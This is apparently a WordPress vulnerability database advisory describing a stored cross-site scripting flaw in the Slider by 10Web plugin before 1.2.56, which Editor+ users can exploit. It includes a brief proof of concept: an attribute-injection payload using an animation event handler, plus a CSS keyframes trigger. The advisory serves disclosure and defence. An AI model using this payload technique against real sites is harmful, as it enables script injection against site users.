## WordPress Plugin Vulnerabilities

# Slider by 10Web < 1.2.56 - Editor+ Stored XSS

### Description

The plugin does not sanitise and escape some of its Slide options, which could allow authenticated users with access to the Sliders (by default Administrator, however this can be changed via the plugin's options) and the ability to add images (Editor+) to perform Stored Cross-Site Scripting attacks

### Proof of Concept

1.) Add a new slide image
2.) Add the following payload in the "Link the slide to:" field in Slide Options:
http://123.123" style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(/XSS/)"
3.) Add the following to CSS textbox in main settings of new slider:
@keyframes slidein {}
